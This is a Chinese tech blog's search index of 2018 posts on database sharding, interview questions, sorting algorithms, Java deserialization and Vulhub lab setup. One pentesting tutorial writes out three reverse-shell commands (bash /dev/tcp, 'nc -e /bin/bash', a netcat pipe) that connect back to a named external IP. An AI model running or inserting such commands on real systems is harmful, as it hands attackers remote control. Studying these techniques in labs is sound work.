<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[java中的各种锁]]></title>
    <url>%2Fposts%2F2018-11-28-java%E4%B8%AD%E7%9A%84%E5%90%84%E7%A7%8D%E9%94%81.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>锁</tag>
        <tag>CAS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据库拆分]]></title>
    <url>%2Fposts%2F2018-11-26-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8B%86%E5%88%86.html</url>
    <content type="text"><![CDATA[一、数据库的拆分当数据库的数据量非常大时，水平拆分和垂直拆分是两种常见的降低数据库大小，提升性能的方法。其实在大多数分布式场景中，水平拆分和垂直拆分也通常是两种降低耦合，提升性能的架构设计或者业务拆分方法。 假设我们在数据库中有用户表1234567891011create table user( id bigint, name varchar(50), password varchar(32), age int, sex tinyint, email varchar(32), sign varchar(64), intro varchar(256) ...)engine=innodb charset=utf8; 水平拆分是指，以某个字段（如ID）为依据，按照一定规则（例如hash、取模），将一个库（表）上的数据拆分到多个库（表）上，以降低单库（表）的大小，水平切分后，各个库(表)的特点是： （1）每个库（表）的结构都一样 （2）每个库（表）的数据不一样，没有交集 （3）所有库（表）的并集是全量数据 垂直拆分是将一个属性较多，一行数据较大的表，将不同的属性拆分到不同的表中，以降低单库（表）的大小，达到提升性能的目的的方法。垂直拆分后，各个库（表）的特点是： （1）每个库（表）的结构都不一样 （2）一般来说每个库（表）的属性至少有一列交集，一般是主键 （3）所有库（表）的数据并集是全量数据 以上文的用户表为例，如果要垂直拆分，可能拆分的结果会是这样的： 12345678910111213141516create table user_base( id bigint, name varchar(50), password varchar(32), age int, sex tinyint, email varchar(32), ...)create table user_ext( id bigint, sign varchar(64), intro varchar(256), ...) 从结果上来看，水平拆分实际上是将数据进行了拆分存储，垂直拆分是将元数据或者字段以及数据进行拆分存储。 二、垂直拆分的依据是什么那垂直拆分的依据又是什么呢？当一个表属性很多时，如何来进行垂直拆分呢。通常情况下，我们会按照以下几点进行数据的拆分：（1）将长度较短、访问频率高的属性尽量放在一个表里，这个表暂且称为主表（2）将字段较长、访问频率较低的属性尽量放在一个表里，这个表暂且称为扩展表（3）如何1和2都满足，还可以考虑第三点，将经常一起访问的属性，也放在一个表里 优先考虑1、2，第3点不是必须的，如果实在属性过多，主表和扩展表都可以有多个。 一般来说，数据量并发量较大时，数据库的上层都会有一个服务层，需要注意的是，当应用需要同时访问主表和扩展表中的数据时，服务层不要使用join来连表查询，而是应该分两次进行查询。 原因是，在大数据、高并发的互联网场景下，一般来说，吞吐量和拓展性是主要矛盾。（1）join更消耗数据库性能（2）join或让base表和ext表耦合在一起（必须在一个数据库实例上），不利于数据量大时拆分到不同的数据库实例上，毕竟减少数据量，提升性能才是垂直拆分的初衷。 三、为什么要这样拆分为什么将字段段、访问频率高的属性放到一个表里？为什么垂直拆分可以提升性能？因为：（1）数据库有自己的内存buffer，会将磁盘上的数据load到内存buffer里（2）内存buffer缓存数据是以row为单位的（3）在内存有限的情况下，在数据库的buffer里缓存短row，就能缓存更多数据（4）在数据库内存buffer里缓存访问频率高的row，就能提升缓存命中率，减少磁盘IO 还是以上面的用户表为例，假如数据库的缓存buffer有1G，未拆分的user表一行数据的大小为1k，那么只能缓存100w行数据，如果拆分成user_base和user_ext之后：（1）user_base访问频率高，一行大小只有0.1k，那内存buffer就可以近乎缓存1000w行user_base数据（2）user_ext访问频率低，一行大小0.9k拆分后缓存就能更多命中记录，磁盘访问概率大大降低，数据库访问的时延会大大降低，吞吐量也就会相应增加。 四、总结1、水平拆分和垂直拆分都是降低数据量大小，提升数据库性能的常见手段2、流量大、数据量大时，不要通过join来获取主表和扩展表的属性3、数据库的拆分依据，尽量把长度较短、访问频率较高的属性放在主表中 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>架构</category>
      </categories>
      <tags>
        <tag>分布式</tag>
        <tag>数据库拆分</tag>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[生活-文艺到爆的句子]]></title>
    <url>%2Fposts%2F2018-11-26-%E7%94%9F%E6%B4%BB-%E6%96%87%E8%89%BA%E5%88%B0%E7%88%86%E7%9A%84%E5%8F%A5%E5%AD%90.html</url>
    <content type="text"><![CDATA[1、我慢慢明白了为什么我不快乐，因为我总是期待一个结果。看一本书期待它让我变得深刻；吃饭、游泳期待它让我一斤斤瘦下；发一条微信期待被回复；对别人好期待被回待以好；写一个故事期待被关注安慰；参加一个活动，期待换来充实丰富的经历；这些预设的期待如果实现了，我就长舒一口气。如果没有实现，就自怨自艾。可是小时候也是同一个我，用一个下午的时间看蚂蚁搬家，等石头开花。小时候不期待结果，小时候的笑哭都不打折。 ——《允许自己虚度时光》 2、在一回首间，才忽然发现，原来我一生的种种努力，不过只是为了周遭的人对我满意而已，为了博得他人的称许和微笑，我战战兢兢的将自己套入所有的模式所有的桎梏，走到途中才发现，我只剩下一副模糊的面目，和一条不能回头的路。 ——席慕蓉《独白》 3、我确实真诚地喜欢过你，想过带你去看每年故宫的初雪，阿拉斯加的海岸线，我曾愿意与你两人独占一江秋，愿意与你郡亭枕上看潮头，铺着红地毯的礼堂，暮霭沉沉的原野，我都曾愿与你共享，我想想过和你一起生活，直到白发苍苍垂垂老矣，同枕共穴，至死不休。可是我现在确实不喜欢你了，车站年久失修，江南的砖瓦裂了缝，当初不撞南墙不会头的热血已然冷却。抱歉啦，我们就此别过吧，我的喜欢要留给别人了。此生勿复见，山水不相逢。 ——钟意《摘录墙》 4、从童年起，我便独自一人，照顾着历代的星星。 ——《孤独》 5、我不在装模做样的拥有很多朋友，而是回到了孤单之中，以真正的我开始了独自的生活，有时我也会因为寂寞而难以忍受空虚的折磨，但无宁愿以这样的方式来维护自己的自尊，也不愿以耻辱为代价去换取那种表面的朋友。 ——余华《在细雨中呼喊》 6、太敏感的人会体谅到他人的痛苦，自然就无法轻易做到坦率，所谓的坦率，其实就是暴力。敏感的人会被动性的洞穿对方的难处，就不能无动于衷，总想着为对方分担一些，就算是要委屈自己，往往敏感的人在事情未发生前就提前自我创造了痛苦。所以那些共情能力弱的人，是很自私光明的在幸福着。好想抱一抱每一个因为敏感而变得小心翼翼的人，我懂得他们内心的善良，亦知晓他们的可贵。要好好对待身边敏感且善良的人才好。 7、你要知道什么是自己想要的，知道什么是不可逆转的，知道用什么方式实现梦想，知道用什么心情面对苦难，人就在转瞬间感悟，进退得失不离不弃也就都有了答案。我不知道命运会把我带到何方，但是我一直会用善良维护左右。 8、上邪，我欲与君相如，长命无绝哀。山无棱，江水为竭。冬雷震震，夏雨雪。天地合，乃敢与君绝。 ——上邪 9、我装作老成，人们就传言我老成。我假装是个懒汉，人人就讹传我是懒惰虫。我假装不会写小说，人们就讹传我不会写。我伪装成骗子，人们就说我是个骗子。我充阔，人人以为我是阔佬。我故作冷谈，人人就说我是个无情的家伙。然而，当我真的痛苦万分，不由得呻吟时，人人却认为我是在无病呻吟。 ——太宰治 10、我所有的自负都来自我的自卑，所有的英雄气概都来自我内心的软弱，所有的振振有词都因为心中满是怀疑，我假装深情，其实是痛恨自己的无情，我以为人生的意义在于四处游荡流亡，其实只是掩饰至今没有找到可以驻足的地方。 ——马良《坦白书》 11、事情往往是这样的，你生了一种病，然后发现导出都是同病者。你丢了一只狗，随后发现满大街都是流浪狗，却都不是你丢的那一只。人的境遇是一种筛子，删选了落到了我们视野的人和事，人一旦掉到了一种境遇里，就会变成吸铁石，把铁屑吸到身边来。 ——韩松落《鲤.旅馆》 12、每个人的心中都有一团火，路过的人只看到了烟。但是总有一个人，总有那么一个人能看到这团火，然后走过来，陪我一起。我在人人群中，看到了他的火，然后快步走过去，生怕慢一点他就会被淹没在岁月的尘埃里。我带着我的热情，我的冷漠，我的狂暴，我的温和，以及对爱情的毫无理由的相信，走的上气不接下气。我结结巴巴的对他说：你叫什么名字。从你叫什么名字开始，后来，有了一切。 ——梵高写提奥的信 13、我渴望能见你一面，但请你记得，我不会开口见你。这不是因为我骄傲，你知道我在你面前毫无骄傲可言，而是因为，唯有你也想见我的时候，我们见面才有意义。 ——西蒙波伏娃 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>诗意</tag>
        <tag>文艺</tag>
        <tag>美句</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java反序列化漏洞浅析]]></title>
    <url>%2Fposts%2F2018-11-13-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90.html</url>
    <content type="text"><![CDATA[0x01 前言 2015年11月6日FoxGlove Security安全团队的@breenmachine 发布了一篇长博客，介绍了如何利用Java反序列化漏洞，来攻击最新的Jenkins、Jboss、WebLogic等java应用，实现远程代码执行漏洞。 事实上，早在2015年的1月28号，Gabriel Lawrence (@gebl)和Chris Frohoff (@frohoff)在AppSecCali上给出了一个报告[5]，报告中介绍了Java反序列化漏洞可以利用Apache Commons Collections这个常用的Java库来实现任意代码执行。 确实，Apache Commons Collection这样的基础类库有非常多的Java应用都在用，一旦编程人员误用了反序列化机制，使得用户的输入可以直接被反序列化，就能导致任意代码执行，这是一个极其严重的事情。 0x02 Java序列化和反序列化 今天我们就以Java的反序列化漏洞做一个简单的分析。在这之前先了解一下Java的序列化和反序列化。 序列化就是把对象的状态信息转换为字节序列(即可以存储或传输的形式)过程反序列化即逆过程，将字节流还原为对象 java序列化经常用在把对象的字节序列存储在磁盘上，另一个用途是在网络上传输对象。例如最常见的是web服务器中Session对象，当有10万用户并发访问，就有可能出现10万个session对象，内存可能吃不消，于是web容器就会把一些session先序列化到硬盘中，等要用的时候，再把保存在磁盘上的对象加载到内存中。 Java中的ObjectOutputStream类的writeObject 方法可以实现序列化，类ObjectInputStream类的readObject方法可以用于反序列化。下面是一个将字符串对象先进行序列化存储到本地文件，在通过反序列化进行恢复的代码。 12345678910111213141516171819public class TestSerialize()&#123; public static void main(String[] args)&#123; String s = "test"; // 将序列化对象写入文件中 FileOutputStream fos = new FileOutputStream("object.ser"); ObjectOutputStream os = new ObjectOutputStream(fos); os.writeObject(s); os.close; // 从文件中读取对象 FileInputStream fis = new FileInputStream("object.ser"); ObjectInputStream ois = new ObjectInputStream(fis); // 通过反序列化恢复对象 String s1 = (String)ois.readObject(); ois.close(); &#125;&#125; 问题在于，如果java应用对于用户输入，即不可信的数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象产生过程中就有可能带来任意代码执行。 所以这个问题的根源在于ObjecInputStream在反序列化时，没有对生成的对象的类型做限制。 0x03 利用Apache Commons Collections实现远程代码执行 本篇以Apache Commons Collections为例，来解释如何构造对象，能够让程序在反序列化时，即调用readObject()时，就能直接实现远程代码执行。 Java中Map是存储键值对的数据结构。在Apache Commons Collections中实现了类TransformedMap，用来对Map进行某种转换，只需要调用decorate()函数，传入key和value的变换函数Transformer，就可以从任意Map对象生成相应的TransformedMap，decorate的函数如下： 123public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer)&#123; return new TransformedMap(map, keyTransformer, valueTransformer);&#125; Transformer是一个接口，其中定义的transform()函数用来将一个对象转换为另一个对象，如下所示： 123public interface Transformer&#123; public Object transform(Object input);&#125; 当Map中的任意key或value更改时，相应的Transformer就会被调用。除此之外，多个Trnansformer还能串起来，形成调用链ChainedTransformer。Apache Commons Collections已经实现了一些Transformer，其中有一个可以通过java的反射机制调用任意函数，叫做InvokerTransformer,代码如下： 123456public class InvokerTransformer implements Transformer, Serializable&#123; ... public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)&#123; &#125;&#125; (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>反序列化</tag>
        <tag>Java</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-二分查找(下)]]></title>
    <url>%2Fposts%2F2018-11-09-%E7%AE%97%E6%B3%95-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE-%E4%B8%8B.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-二分查找(上)]]></title>
    <url>%2Fposts%2F2018-11-09-%E7%AE%97%E6%B3%95-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE-%E4%B8%8A.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-排序优化]]></title>
    <url>%2Fposts%2F2018-11-09-%E7%AE%97%E6%B3%95-%E6%8E%92%E5%BA%8F%E4%BC%98%E5%8C%96.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[Linux反弹shell的三种方法]]></title>
    <url>%2Fposts%2F2018-11-06-Linux%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95.html</url>
    <content type="text"><![CDATA[0x01 前言 在渗透测试中，当我们可以得到一个可以执行远程命令的漏洞时，我们通常会去获取一个shell，但是通常服务器防火墙亦或者云上都会对端口等进行严格控制，导致不能通过监听端口进行shell连接，这种情况下该怎么获取shell呢？ 而通常情况下，不论是防火墙还是云盾等防护措施，不会对服务器对外连接进行限制（特殊情况除外），这时候就可以通过反弹shell来获取连接，即通过服务器反向连接一个外部机器来获取一个shell。 0x02 获取shell 通过上面的解释，可以知道，反弹shell需要一个外部可访问的服务器，即需要一个有公网IP访问的服务器，作为黑客的攻击服务器。 我这里用自己的VPS机器作为一个攻击机器（IP: 130.211.244.96），操作系统是Centos7。用一个局域网虚拟机作为一个有漏洞的受害机器，即被攻击机器（IP: 192.168.6.220)，操作系统也是Centos7。 通过bash反弹shell第一种方法是直接利用bash进行反向shell的连接。首先在黑客的攻击机器130.211.244.96开启监听端口，监听来自外部的反向连接。打开终端，执行命令nc -lvvp 7777,这里用nc监听130.211.244.96的7777端口（更多的nc使用方法请自行了解）。之后在被攻击机器上即受害机器上192.168.6.220执行反向连接的bash命令bash -i &gt;$ /dev/tcp/130.211.244.96/7777 0&gt;&amp;1。 bash -i的意思是打开一个交互式shell，/dev/tcp/建立一个tcp的socket连接，&gt;&amp;将标准错误输出重定向到标准输出中，0&gt;&amp;1将标准输入重定向到标准输出中。 下面来看一下具体的效果，先在攻击机器上监听端口： 在受害机器上反弹shell： 之后可以看到攻击机器上返回了一个受害机的bash，可以执行命令，到此就利用bash获得了一个反向shell。 利用netcat反弹shell如果受害机上安装了netcat，也可以利用netcat来进行反弹shell。 同样，先在攻击机器上130.211.244.96开启监听端口nc -lvvp 7777，等待受害机器连接。 在受害机器上执行命令nc -e /bin/bash 130.211.244.96 7777,反弹一个bash的shell给攻击机器。然后就可以在攻击机器上执行命令了。 利用管道反弹shellnetcat的-e 参数后面跟一个可执行程序的名称，当连接被建立时，会运行这个程序。而在有的发行版linux中netcat是不带这个参数的，这时候可以利用管道进行反弹shell。 首先在攻击机器上130.211.244.96利用nc监听两个端口7777、7778。 然后在受害机器上执行命令nc 130.211.244.96 7777 | /bin/bash | nc 130.211.244.96 7778，该命令意思是连接攻击机7777端口，将传递过来的命令交给/bin/bash 执行然后将结果返回到7778端口。 这样在攻击机上就获得了一个shell，通过在7777端口执行命令，在7778端口进行命令的回显，如下图示。 当然还有其他反弹shell的方法，比如利用Python、Perl进行socket的反弹shell，重在思路，具体的方法肯定网上会有大牛给出的。 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>反弹shell</tag>
        <tag>netcat</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微服务面试题]]></title>
    <url>%2Fposts%2F2018-11-02-%E5%BE%AE%E6%9C%8D%E5%8A%A1%E9%9D%A2%E8%AF%95%E9%A2%98.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[数据库面试题]]></title>
    <url>%2Fposts%2F2018-11-02-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%9D%A2%E8%AF%95%E9%A2%98.html</url>
    <content type="text"><![CDATA[1、SQL优化的常见方法2、SQL索引的顺序、字段的顺序3、查看SQL索引4、Mysql分页查询语句5、Mysql的事物特性和隔离级别 事务特性(ACID) 原子性(Atomicity):一个事务必须视为一个不可分割的最小工作单元，整个事务中的所有操作要么全部提交成功，要么全部失败回滚。 一致性(Consistency):数据库总是从一个一致性的状态转移到另一个一致性的状态 隔离性(Isolation)：一个事务所做的修改在最终提交前，对其他事务是不可见的。 持久性(Durability)：一旦事务提交，其所做的修改就会永久的保存在数据库中 隔离级别： 读未提交(read-uncommited)：一个事务读取另一个事务未提交的数据，可能会出现脏读 读已提交(read-commited)：一个事务要等到另一个事务提交后才能读取数据，可能会出现不可重复读 可重复读(repeatable-read)：开始读取数据的事务开始后，不在允许修改动作，可能会出现幻读 序列化读(Serializble)：串行化顺序执行大多数数据库默认的隔离级别是read commited如sql server、oracle，Mysql的默认级别是repeatable-read。 6、sql having的使用场景7、Mysql数据库的索引及原理 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[Dubbo面试题]]></title>
    <url>%2Fposts%2F2018-11-02-Dubbo%E9%9D%A2%E8%AF%95%E9%A2%98.html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[Spring面试题]]></title>
    <url>%2Fposts%2F2018-11-02-Spring%E9%9D%A2%E8%AF%95%E9%A2%98.html</url>
    <content type="text"><![CDATA[1、consul的可靠性2、spring的原理，AOP/IOC原理3、spring bean生命周期4、什么是依赖注入DI、IOC是同一个概念。依赖注入是当一个对象需要依赖另一个对象的协助时，创建、管理被依赖对象的工作由Spring来完成，而不是由调用者完成，因此称为控制反转，创建被依赖对象的实例也是由spirng容器来创建，并注入给调用者，因此称为依赖注入。 5、Spring在SSM中起什么作用 spring： 是一个轻量级框架 作用： Bean工厂，用来管理Bean的声明周期和框架集成 两大核心： IOC/DI(控制反转/依赖注入)，由spring控制将所需的对象注入到相应的类中，spring顶层容器为BeanFactory AOP：面向切面编程 6、Spring的事务 编程式事务： 编程方式管理事务，灵活，但难管理 声明式事务： 将业务代码和事务管理分离，用注解和xml配置来管理事务 7、IOC在项目中的作用IOC解决了对象之间的依赖问题，把所有的Bean的依赖关系通过注解或者配置文件关联起来尽心管理，降低和耦合度。 8、Spring DI的注入方式 构造注入 set注入 接口注入 9、IOC、AOP实现原理 IOC：通过反射机制生成对象进行注入 AOP：通过动态代理 10、Spring MVC的架构/工作流程图 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[Java面试题]]></title>
    <url>%2Fposts%2F2018-11-02-Java%E9%9D%A2%E8%AF%95%E9%A2%98.html</url>
    <content type="text"><![CDATA[1、HashMap和HashTable区别HashMap是HashTable的轻量实现（非线程安全），他们都实现的Map接口，主要区别在于：线程安全，同步，性能 HashTable继承Dictionary，HashMap继承的是java2出现的Map接口； HashMap允许将null作为key或value，hashtable不允许； HashMap是非同步的，HashTable是同步的(synchronized),所以HashMap线程不安全，而HashTable是线程安全的，多个线程可以共享一个HashTbale而不需要为自己的方法实现同步。Java5提供了ConcurrentMap，用来替代HashTable，比HashTable扩展性好； 由于HashMap是非线程安全的，所以单一线程访问，HashMap性能要高于HashTable； HashMap的迭代器（Iterator）是fail-fast迭代器，HashTable的enumerator迭代器不是fail-fast的。 HashMap把HashTable的contains方法去掉了，换成了containsValue和containsKey HashTable中数组默认大小是11，扩容方法是old*2+1;HashMap默认大小是16，扩容每次为2的指数大小 2、Object的hashcode方法，equals方法，常用的地方3、HashMap的原理应用场景4、JDK中有哪些线程池5、TCP/UDP区别相同点： 都处于OSI七层模型的网络层，都是传输层协议，都能保护网络层的传输，双方通信都需要开放端口。 异同点： TCP UDP 1 Transmission Control Protocol 传输控制协议 User Data Protocol 用户数据报协议 2 TCP的传输是可靠传输 UDP的传输是不可靠传输 3 TCP是基于连接的协议，在正式收发数据前，必须和对方建立可靠的连接 UDP是和TCP相对应的协议，他是面向非连接的协议，他不与对方建立连接，而是直接把数据包发送出去 4 TCP是一种可靠的通信服务，负载相对而言比较大，TCP用套接字(socket)或者端口进行通信 UDP是一种不可靠的网络服务，负载相对较小 5 TCP和UP的结构不同，TCP包括序号、确认信号、数据偏移、控制标志(通常URG、ACK、PSH、RST、SYN、FIN)、窗口、检验和、紧急指针、选项等信息 UDP包含长度和检验和信息 6 TCP提供超时重发，丢弃重复数据，检验数据，流量控制等，保证数据从一端传到另一端 UDP不提供可靠性，他只是把应用程序传给IP层的数据发送出去，但是不能保证他们到达目的端 7 TCP发送数据包前会在通信双方间建立三次握手，确保双方准备好，在传输数据包期间，TCP会根据链路中数据流量的大小来调节传送的速率，传输时如果发现有丢包，会有严格的重传机制，故而传输速度很慢 UDP在传输数据报前不用在客户端和服务器之间建立连接，且没有超时重发机制，故而传输速度很快 8 TCP支持全双工和并发的TCP连接，提供确认、重传、拥塞控制 UDP适用于对系统性能要求高于数据完整性的要求，需要简短快捷的数据交换、需要多播和广播的应用环境 6、查找一个数组的中位数7、反射的机制8、Object类中的方法9、对象比较是否相等10、toString方法的常用地方，为什么要重写该方法11、HashMap put方法怎么判断是否是重复方法12、Set和List的区别13、ArrayList和LinkedList的区别14、TreeSet对存入的数据有什么要求吗？15、HashSet是不是线程安全的16、Java中有哪些线程安全的Map17、CocurrentHashMap是怎么做到线程安全的18、如何保证线程安全问题19、volatile原子性问题？为什么i++不支持原子性20、CAS操作21、lock和synchronized区别22、公平锁和非公平锁23、Java读写锁，读写锁解决的问题 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[漏洞靶场Vulhub使用]]></title>
    <url>%2Fposts%2F2018-11-01-%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BAVulhub%E4%BD%BF%E7%94%A8.html</url>
    <content type="text"><![CDATA[前言 Vulhub是一个面向大众的开源漏洞靶场，采用docker进行搭建，但是无需docker知识，简单执行两条命令即可编译、运行一个完整的靶场环境。该项目旨在让漏洞复现变得更加简单，让安全研究人员更专注于漏洞本身。 安装 我在Centos7上进行的如下步骤，如果在其他类型的机器上，可以参照进行各个环境的安装 123456# 安装gityum install git# 安装docker并启动dockeryum install docker &amp;&amp; systemctl start docker# 安装docker-composeyum install docker-compose 由于该漏洞环境镜像均来自于Dockerhub/Github/软件官网，所以在国内访问可能会存在速度慢、丢包等问题，导致环境地洞太卡，影响正常使用，请自行解决翻墙问题，或者采用加速器进行加速。 docker-compose用户组合服务和内网，有的环境涉及到多个容器、端口等，docker-compose可以做到环境的一键化管理，用户不需要再学习各种参数和用法，只需要简单的执行docker-compose up -d即可启动容器环境。 安装完上述环境之后，可以通过以下命令来下载vulhub环境到任何目录 1git clone https://github.com/vulhub/vulhub.git 启动漏洞环境 docker-compose会自动查找当前目录下的配置文件(默认文件名为docker-compose.xml),并根据其内容编译镜像和启动容器。所以，要运行某个漏洞靶场，需要先进入该漏洞所在的目录。 在vulhub中选择某个环境，进入对应目录。如Flask服务端模板注入漏洞，我们进入flask/ssti目录，执行如下命令，进行漏洞靶场的编译和运行：123cd flask/sstidocker-compose builddocker-compose up -d (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
  </entry>
  <entry>
    <title><![CDATA[算法-排序(下)]]></title>
    <url>%2Fposts%2F2018-09-25-%E7%AE%97%E6%B3%95-%E6%8E%92%E5%BA%8F(%E4%B8%8B).html</url>
    <content type="text"><![CDATA[前言 上一节着重分析了几种常用排序算法的原理、时间复杂度、空间复杂度、稳定性等。今天会接触三种时间复杂度为O(n)的排序算法：桶排序、基数排序、计数排序。因为这些排序算法的时间复杂度是线性的，所以把这类排序算法叫做线性排序。之所以能做到线性的时间复杂度，是因为这三种算法是基于非比较的排序算法，都不涉及元素之间的比较操作。 这几种算法理解起来都不难，时间、空间复杂度分析起来也很简单，但是对要排序的数据要求很苛刻，所以今天学习掌握这些排序算法的适用场景。 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-排序(中)]]></title>
    <url>%2Fposts%2F2018-09-23-%E7%AE%97%E6%B3%95-%E6%8E%92%E5%BA%8F(%E4%B8%AD).html</url>
    <content type="text"><![CDATA[(adsbygoogle = window.adsbygoogle || []).push({}); 前言 上一节讲到冒泡排序、插入排序、选择排序这三种排序算法，他们的时间复杂度都是$O(n^2)$，比较高，适合小规模的排序。今天讲两种时间复杂度为$O(nlogN)$的排序算法，归并排序和快速排序。这两种算法适合大规模的数据排序，比上一节的三种算法更常用。 归并排序和快速排序都用到了分治思想，非常巧妙，我们可以借鉴这个思想，来解决非排序的问题，比如：如何在O(n)时间复杂度内查找一个无序数组中的第K大元素？，这就要用到今天讲的内容。]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>排序</tag>
        <tag>快速排序</tag>
        <tag>堆排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-排序(上)]]></title>
    <url>%2Fposts%2F2018-09-20-%E7%AE%97%E6%B3%95-%E6%8E%92%E5%BA%8F(%E4%B8%8A).html</url>
    <content type="text"><![CDATA[前言 排序对一个程序员来说，可能都不会陌生。大部分编程语言中，也都提供了排序函数。在平成的项目中，也经常会用到排序。排序非常重要，所以会分几节详细讲一讲经典的排序算法。 排序算法太多了，可能有的连名字都没有听说过，比如猴子排序、睡眠排序、面条排序等等。这里只列举众多排序算法众多的一小撮，也是最经典的、最常用的：冒泡排序、插入排序、选择排序、归并排序、快速排序、计数排序、基数排序、桶排序。按照时间复杂度把他们分成了三类，分上中下三节来讲。 排序算法 时间复杂度 是否基于比较 上 冒泡、插入、选择 $ O(n^2) $ √ 中 快排、归并 $ O(nlogN) $ √ 下 桶、计数、基数 $ O(n) $ × (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>排序</tag>
        <tag>冒泡排序</tag>
        <tag>插入排序</tag>
        <tag>选择排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-递归]]></title>
    <url>%2Fposts%2F2018-09-18-%E7%AE%97%E6%B3%95-%E9%80%92%E5%BD%92.html</url>
    <content type="text"><![CDATA[前言 推荐注册返佣金这个功能我想你应该不陌生吧？现在很多app都有这个功能。这个功能中，用户A推荐用户B注册，用户B又推荐了用户C注册，我们可以说C的“最终推荐人”为用户A，用户B的“最终推荐人”也为用户A，用户A没有“最终推荐人”。 一般来说，我们会通过数据库记录这种推荐关系，在数据库表中，我们可以记录两行数据，其中actor_id表示用户id，referrer_id表示推荐人id。 actor_id referer_id B A C B 基于这个背景，我的问题是，给定一个用户ID，如何查找这个用户的“最终推荐人”？ 带着这个问题，我们来学习今天的内容，递归（Recursion）！ 如何理解递归 从我自己学习数据结构和算法的经历来看，我个人觉得，有两个最难理解的知识点，一个是动态规划，另一个就是递归。 递归是一种应用非常广泛的算法，之后很多的数据结构和算法的编码实现都要用到递归，比如DFS深度优先搜索，前中后序二叉树遍历等等，所以，搞懂递归非常重要，否则，后面复杂一点的数据结构和算法学起来就会比较吃力。 不过，别看我说了这么多，递归本身可一点不“高冷”，我们生活中就有很多用到递归的例子。 比如周末你带着女朋友去电影院看电影，女朋友问你，我们坐在第几排？电影院太黑了，没法数，现在你怎么办？ 这时候递归就派上用场了，于是你问前面一排的人他是第几排，你想只要在他的数字上加一，就知道自己在那一排了。但是，前面的人也不清楚，所以他也问他前面的人，就这样一排一排往前问，直到问道第一排的人，说我在第一排，然后在这样一排一排再把数字传回来，直到你前面的人告诉你他在那一排，于是你就知道答案了。 这就是一个标准的用递归求解问题的分解过程，去的过程叫“递”，回来的过程叫“归”。基本上，所有的递归问题都可以用递推公式来表示，刚刚这个生活中的例子，我们用递推公式来表示就是下面这样的 $$ f(n) = f(n-1) +1 ;\ 其中f(1)=1 $$ f(n)表示你想知道自己在那一排，f(n-1) 表示前面一个人所在的排数，f(1)=1表示第一排的人知道自己在第一排。有了这个递推公式，我们就可以很轻松的将它改为递归代码：1234int f(int n)&#123; if(n==1) return 1; return f(n-1)+1;&#125; 什么时候可以用递归呢 刚刚这个例子是典型的递归，那究竟什么问题可以用递归来解决呢？我这总结了三个条件，只要同时满足以下三个条件，就可以用递归来解决 。 1、一个问题的解可以分解为几个子问题的解 何为子问题？子问题就是数据规模更小的问题。比如，前面的电影院的例子，你要知道自己在哪排，可以分解为”前一排的人在那一排？”这样一个子问题。 2、这个问题与分解之后的子问题，除了数据规模不同，求解思路完全一样 还是以电影院的例子说明，你求解“自己在那一排”，和前面的人求解“自己在那一排”的思路，是完全一样的。 3、存在递归终止条件 把问题分解为子问题，再把子问题分解为子子问题，一层一层分解，不能存在无限循环，这就需要存在终止条件。在电影院的例子中，第一排的人不需要再继续询问任何人，就知道自己在那一排，也就是f(1)=1，这就是递归的终止条件。 如何写递归代码 